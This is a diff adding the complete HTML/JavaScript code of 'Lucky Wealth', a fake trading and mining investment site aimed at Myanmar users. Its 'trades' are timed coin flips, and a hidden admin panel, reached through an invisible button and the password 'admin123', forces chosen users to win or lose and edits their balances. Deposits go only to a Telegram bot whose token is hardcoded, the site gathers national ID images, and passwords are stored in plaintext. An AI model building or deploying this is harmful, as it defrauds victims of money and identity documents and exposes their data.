@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lucky Wealth - Master Pro</title>
+    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database-compat.js"></script>
+    <style>
+        :root { --gold: #D4AF37; --dark: #080808; --card: #151515; --text: #e0e0e0; --green: #00ff88; --red: #ff3333; }
+        body { background: var(--dark); color: var(--text); font-family: sans-serif; margin: 0; padding-bottom: 50px; }
+        .page { display: none; padding: 15px; max-width: 480px; margin: auto; }
+        .active { display: block; }
+        .header { padding: 20px; text-align: center; background: #111; border-bottom: 2px solid var(--gold); position: relative; border-radius: 0 0 20px 20px; }
+        .card { background: var(--card); padding: 15px; border-radius: 15px; border: 1px solid #333; margin: 10px 0; }
+        .gear-btn { position: absolute; right: 20px; top: 20px; font-size: 24px; cursor: pointer; color: var(--gold); }
+        input, select { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #444; background: #1a1a1a; color: white; box-sizing: border-box; }
+        .btn { width: 100%; padding: 14px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; margin: 5px 0; transition: 0.3s; text-transform: uppercase; }
+        .btn-gold { background: linear-gradient(to right, #bf953f, #fcf6ba, #b38728); color: #000; }
+        .btn-buy { background: var(--green); color: #000; flex: 1; }
+        .btn-sell { background: var(--red); color: #fff; flex: 1; }
+        .flex-btns { display: flex; gap: 10px; margin-top: 10px; }
+        .trade-item { background: #1a1a1a; padding: 15px; border-radius: 12px; margin-bottom: 10px; border-left: 4px solid var(--gold); }
+        .address-box { font-size: 11px; word-break: break-all; background: #000; padding: 10px; border-radius: 8px; color: var(--green); margin-bottom: 5px; border: 1px dashed #444; }
+        #trade-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.95); z-index: 1000; text-align: center; padding-top: 80px; }
+    </style>
+</head>
+<body>
+
+    <div id="auth-page" class="page active">
+        <div class="header"><h2>LUCKY WEALTH</h2></div>
+        <div id="login-form" class="card">
+            <h3>Login</h3>
+            <input type="text" id="log-ph" placeholder="Phone Number">
+            <input type="password" id="log-pw" placeholder="Password">
+            <button class="btn btn-gold" onclick="login()">Login</button>
+            <p onclick="toggleAuth(true)" style="text-align:center; color:var(--gold); cursor:pointer;">Create Account</p>
+        </div>
+        <div id="signup-form" class="card" style="display:none;">
+            <h3>Signup</h3>
+            <input type="text" id="sig-un" placeholder="Username">
+            <input type="text" id="sig-ph" placeholder="Phone Number">
+            <input type="password" id="sig-pw" placeholder="Password">
+            <button class="btn btn-gold" onclick="signup()">Signup</button>
+            <p onclick="toggleAuth(false)" style="text-align:center; color:var(--gold); cursor:pointer;">Back to Login</p>
+        </div>
+    </div>
+
+    <div id="dashboard-page" class="page">
+        <div class="header">
+            <span id="display-name">...</span> <span id="verify-badge"></span>
+            <div class="gear-btn" onclick="showPage('setting-page')">⚙️</div>
+        </div>
+        <div class="card" style="text-align:center;">
+            <p>Main Balance</p>
+            <h1 id="user-balance" style="color:var(--green);">0</h1> Ks
+        </div>
+        <button class="btn btn-gold" onclick="showPage('mining-page')">🏦 LOCKUP MINING</button>
+        
+        <h4>MARKETS (5 LEVELS)</h4>
+        <div id="game-list">
+            <div class="trade-item">
+                <div style="display:flex; justify-content:space-between;"><b>BTC/USDT (L1)</b> <span style="color:var(--green)">+30%</span></div>
+                <small>Min: 1,000 Ks | 30s</small>
+                <input type="number" id="amt-1" value="1000">
+                <div class="flex-btns"><button class="btn btn-buy" onclick="startGame(1, 0.3, 30)">BUY</button><button class="btn btn-sell" onclick="startGame(1, 0.3, 30)">SELL</button></div>
+            </div>
+            <div class="trade-item">
+                <div style="display:flex; justify-content:space-between;"><b>ETH/USDT (L2)</b> <span style="color:var(--green)">+50%</span></div>
+                <small>Min: 10,000 Ks | 180s</small>
+                <input type="number" id="amt-2" value="10000">
+                <div class="flex-btns"><button class="btn btn-buy" onclick="startGame(2, 0.5, 180)">BUY</button><button class="btn btn-sell" onclick="startGame(2, 0.5, 180)">SELL</button></div>
+            </div>
+            <div class="trade-item">
+                <div style="display:flex; justify-content:space-between;"><b>GOLD/XAU (L3)</b> <span style="color:var(--green)">+80%</span></div>
+                <small>Min: 30,000 Ks | 240s</small>
+                <input type="number" id="amt-3" value="30000">
+                <div class="flex-btns"><button class="btn btn-buy" onclick="startGame(3, 0.8, 240)">BUY</button><button class="btn btn-sell" onclick="startGame(3, 0.8, 240)">SELL</button></div>
+            </div>
+            <div class="trade-item">
+                <div style="display:flex; justify-content:space-between;"><b>NASDAQ (L4)</b> <span style="color:var(--green)">+100%</span></div>
+                <small>Min: 200,000 Ks | 240s</small>
+                <input type="number" id="amt-4" value="200000">
+                <div class="flex-btns"><button class="btn btn-buy" onclick="startGame(4, 1.0, 240)">BUY</button><button class="btn btn-sell" onclick="startGame(4, 1.0, 240)">SELL</button></div>
+            </div>
+            <div class="trade-item">
+                <div style="display:flex; justify-content:space-between;"><b>VIP MASTER (L5)</b> <span style="color:var(--green)">+200%</span></div>
+                <small>Min: 1,000,000 Ks | 300s</small>
+                <input type="number" id="amt-5" value="1000000">
+                <div class="flex-btns"><button class="btn btn-buy" onclick="startGame(5, 2.0, 300)">BUY</button><button class="btn btn-sell" onclick="startGame(5, 2.0, 300)">SELL</button></div>
+            </div>
+        </div>
+
+        <div class="flex-btns">
+            <button class="btn btn-gold" onclick="showPage('deposit-page')">Deposit</button>
+            <button class="btn" style="border:1px solid var(--gold); color:var(--gold); background:none;" onclick="showPage('withdraw-page')">Withdraw</button>
+        </div>
+    </div>
+
+    <div id="mining-page" class="page">
+        <div class="header"><h3>Lockup Mining</h3></div>
+        <div class="card">
+            <select id="mine-plan">
+                <option value="10000,2,3">10,000 Ks | 3 Days (2%)</option>
+                <option value="30000,3.5,7">30,000 Ks | 7 Days (3.5%)</option>
+                <option value="50000,5,15">50,000 Ks | 15 Days (5%)</option>
+                <option value="1000000,10,30">1,000,000 Ks | 30 Days (10%)</option>
+            </select>
+            <input type="number" id="mine-amt" placeholder="Enter Amount">
+            <button class="btn btn-gold" onclick="startMining()">Invest Now</button>
+        </div>
+        <button class="btn" onclick="showPage('dashboard-page')">Back</button>
+    </div>
+
+    <div id="setting-page" class="page">
+        <div class="header"><h3>Profile Security</h3></div>
+        <div class="card">
+            <h4>ID Verification</h4>
+            <select id="id-type"><option>NRC Card</option><option>License</option></select>
+            <input type="file" id="id-image">
+            <button class="btn btn-gold" onclick="uploadVerify()">Submit ID</button>
+        </div>
+        <div class="card">
+            <h4>Change Password</h4>
+            <input type="password" id="old-pw" placeholder="Old Password">
+            <input type="password" id="new-pw" placeholder="New Password">
+            <button class="btn btn-gold" onclick="updatePassword()">Update</button>
+        </div>
+        <button class="btn" onclick="showPage('dashboard-page')">Back</button>
+    </div>
+
+    <div id="deposit-page" class="page">
+        <div class="card">
+            <p id="addr-usdt">USDT: Loading...</p>
+            <p id="addr-wave">Wave: Loading...</p>
+            <input type="number" id="dep-amt" placeholder="Amount">
+            <input type="text" id="dep-trx" placeholder="Transaction ID">
+            <button class="btn btn-gold" onclick="submitDeposit()">Submit Deposit</button>
+        </div>
+        <button class="btn" onclick="showPage('dashboard-page')">Back</button>
+    </div>
+
+    <div id="withdraw-page" class="page">
+        <div class="card">
+            <input type="number" id="wd-amt" placeholder="Withdraw Amount">
+            <input type="text" id="wd-ph" placeholder="Address/Phone">
+            <button class="btn btn-gold" onclick="submitWithdraw()">Confirm</button>
+        </div>
+        <div id="wd-history"></div>
+        <button class="btn" onclick="showPage('dashboard-page')">Back</button>
+    </div>
+
+    <div id="admin-page" class="page">
+        <div class="header"><h3>Super Admin</h3></div>
+        <div class="card">
+            <input type="text" id="target-ph" placeholder="User Phone">
+            <button class="btn btn-gold" onclick="fetchUser()">Find User</button>
+            <div id="admin-controls" style="display:none; margin-top:10px;">
+                <p>Verify: <span id="adm-v"></span> <button onclick="admVerify()">Approve</button></p>
+                <p>Balance: <span id="adm-bal"></span> Ks</p>
+                <input type="number" id="adm-add" placeholder="Add/Sub Amount">
+                <button onclick="admBalance()">Update Bal</button>
+                <p>Mode: <span id="adm-mode"></span></p>
+                <button onclick="admMode('win')">Win</button> <button onclick="admMode('lose')">Lose</button> <button onclick="admMode('random')">Random</button>
+            </div>
+        </div>
+        <div class="card">
+            <h4>Wallets</h4>
+            <input type="text" id="set-usdt" placeholder="USDT Addr">
+            <input type="text" id="set-wave" placeholder="Wave Num">
+            <button onclick="updateWallets()">Save Wallets</button>
+        </div>
+        <button class="btn" onclick="showPage('dashboard-page')">Exit</button>
+    </div>
+
+    <div id="trade-overlay"><h2 id="t-status">TRADING...</h2><h1 id="timer" style="font-size:70px; color:var(--gold);">--</h1></div>
+
+    <script>
+        const firebaseConfig = { apiKey: "AIzaSyAxhjzM9aK4yqLk5PXbkrENmUldUjy78VA", authDomain: "luckywealthgaming.firebaseapp.com", databaseURL: "https://luckywealthgaming-default-rtdb.asia-southeast1.firebasedatabase.app", projectId: "luckywealthgaming", storageBucket: "luckywealthgaming.firebasestorage.app", messagingSenderId: "339185641591", appId: "1:339185641591:web:31ae992886718687df3e72" };
+        const TG_TOKEN = "8614205220:AAHxlphuK5ZM29rEh3J6IEPqPEibMjKNXAY", TG_ID = "7709938396";
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        let currentUser = null, userPass = "";
+
+        function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); }
+        function toggleAuth(s) { document.getElementById('login-form').style.display=s?'none':'block'; document.getElementById('signup-form').style.display=s?'block':'none'; }
+        async function notify(m) { await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: TG_ID, text: m }) }); }
+
+        function signup() {
+            const un=document.getElementById('sig-un').value, ph=document.getElementById('sig-ph').value, pw=document.getElementById('sig-pw').value;
+            db.ref('users/'+ph).set({ username:un, password:pw, balance:0, mode:'random', verify:'Unverified' }).then(() => location.reload());
+        }
+        function login() {
+            const ph=document.getElementById('log-ph').value, pw=document.getElementById('log-pw').value;
+            db.ref('users/'+ph).once('value', s => {
+                if(s.exists() && s.val().password === pw) { currentUser=ph; userPass=pw; showPage('dashboard-page'); listenData(); }
+                else alert("Wrong!");
+            });
+        }
+
+        function listenData() {
+            db.ref('users/'+currentUser).on('value', s => {
+                const d = s.val();
+                document.getElementById('display-name').innerText = d.username;
+                document.getElementById('user-balance').innerText = d.balance.toLocaleString();
+                document.getElementById('verify-badge').innerText = `(${d.verify})`;
+                userPass = d.password;
+            });
+            db.ref('settings/addresses').on('value', s => {
+                document.getElementById('addr-usdt').innerText = "USDT: " + s.val().usdt;
+                document.getElementById('addr-wave').innerText = "Wave: " + s.val().wave;
+            });
+        }
+
+        function startGame(lvl, profit, time) {
+            const bet = parseFloat(document.getElementById('amt-'+lvl).value);
+            db.ref('users/'+currentUser+'/balance').once('value', s => {
+                if(s.val() < bet) return alert("No Balance!");
+                db.ref('users/'+currentUser).update({ balance: s.val() - bet });
+                document.getElementById('trade-overlay').style.display='block';
+                let tl = time;
+                let itv = setInterval(() => {
+                    document.getElementById('timer').innerText = tl-- + "s";
+                    if(tl < 0) {
+                        clearInterval(itv); document.getElementById('trade-overlay').style.display='none';
+                        db.ref('users/'+currentUser+'/mode').once('value', m => {
+                            let win = (m.val()==='win')?true:(m.val()==='lose'?false:Math.random()>0.5);
+                            if(win) { let r=bet+(bet*profit); db.ref('users/'+currentUser).update({ balance: s.val()+r-bet }); alert("WIN +"+r); }
+                            else alert("LOSE! Market Crashed.");
+                        });
+                    }
+                }, 1000);
+            });
+        }
+
+        function submitDeposit() {
+            const a=document.getElementById('dep-amt').value, t=document.getElementById('dep-trx').value;
+            notify(`💰 DEP: ${currentUser}\nAmt: ${a}\nTRX: ${t}`); alert("Sent!");
+        }
+
+        function submitWithdraw() {
+            const amt = parseFloat(document.getElementById('wd-amt').value), ph = document.getElementById('wd-ph').value;
+            db.ref('users/'+currentUser+'/balance').once('value', s => {
+                if(s.val() < amt) return alert("Low Balance!");
+                db.ref('users/'+currentUser).update({ balance: s.val() - amt });
+                db.ref('withdraws').push({ ph: currentUser, amt, target: ph, status: "Pending" });
+                notify(`💸 WITHDRAW\nUser: ${currentUser}\nAmt: ${amt}\nTo: ${ph}`);
+                alert("Pending!");
+            });
+        }
+
+        function startMining() {
+            const p = document.getElementById('mine-plan').value.split(','), amt = parseFloat(document.getElementById('mine-amt').value);
+            if(amt < p[0]) return alert("Min " + p[0]);
+            db.ref('users/'+currentUser+'/balance').once('value', s => {
+                if(s.val() < amt) return alert("Low Balance!");
+                db.ref('users/'+currentUser).update({ balance: s.val() - amt });
+                notify(`🏦 MINING: ${currentUser}\nAmt: ${amt}\nDays: ${p[2]}`); alert("Started!");
+            });
+        }
+
+        function updatePassword() {
+            const op=document.getElementById('old-pw').value, np=document.getElementById('new-pw').value;
+            if(op !== userPass) return alert("Old Password Wrong!");
+            db.ref('users/'+currentUser).update({ password: np }).then(() => { alert("Updated!"); location.reload(); });
+        }
+
+        // ADMIN FUNCTIONS
+        function fetchUser() {
+            const t = document.getElementById('target-ph').value;
+            db.ref('users/'+t).once('value', s => {
+                if(s.exists()){
+                    document.getElementById('admin-controls').style.display='block';
+                    document.getElementById('adm-v').innerText = s.val().verify;
+                    document.getElementById('adm-bal').innerText = s.val().balance;
+                    document.getElementById('adm-mode').innerText = s.val().mode;
+                } else alert("Not Found");
+            });
+        }
+        function admVerify() { db.ref('users/'+document.getElementById('target-ph').value).update({verify:'Verified'}); alert("OK"); }
+        function admBalance() {
+            const t=document.getElementById('target-ph').value, a=parseFloat(document.getElementById('adm-add').value);
+            db.ref('users/'+t+'/balance').transaction(c => (c||0)+a); alert("OK");
+        }
+        function admMode(m) { db.ref('users/'+document.getElementById('target-ph').value).update({mode:m}); alert("OK"); }
+        function updateWallets() {
+            db.ref('settings/addresses').update({ usdt: document.getElementById('set-usdt').value, wave: document.getElementById('set-wave').value });
+            alert("Updated!");
+        }
+        function checkAdmin() { if(prompt("Key?")==="admin123") showPage('admin-page'); }
+    </script>
+    <div style="position:fixed; bottom:0; right:0; width:40px; height:40px;" onclick="checkAdmin()"></div>
+</body>
+</html>
